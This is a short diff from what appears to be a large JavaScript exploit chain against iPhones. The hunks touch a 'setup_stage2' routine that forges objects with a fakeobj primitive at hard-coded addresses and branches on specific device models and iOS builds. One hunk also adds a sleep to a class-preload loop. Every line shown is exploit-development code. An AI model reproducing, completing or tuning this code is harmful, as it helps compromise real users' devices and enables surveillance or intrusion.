@@ -18488,7 +18488,7 @@ const device_chipset = {
           }
           print("setup_stage2: building change_scribble_holder");
           print("setup_stage2: fake sentinel begin");
-          const stage2FakeSentinelAddr = p.device_model === "iPhone15,3_22D60" ? 0x0108240700006000n : 0x108240700000000n;
+          const stage2FakeSentinelAddr = device_model === "iPhone15,3_22D60" ? 0x0108240700006000n : 0x108240700000000n;
           print(`setup_stage2: fake sentinel addr=${stage2FakeSentinelAddr.hex()}`);
           let fake_sentinel = p.fakeobj(stage2FakeSentinelAddr);
           print("setup_stage2: fake sentinel done");
@@ -18977,6 +18977,7 @@ async function main() {
             const [className, cls] = preloadClasses[i];
             if ((p.device_model === "iPhone15,3_22D60" || p.device_model === "iPhone11,8_22B91") && i === 1) {
               print(`preload class[${i}] ${className} skipped for ${p.device_model} cls=${cls.hex()}`);
+              sleep(10);
               continue;
             }
             const worker = dlopen_workers[i];
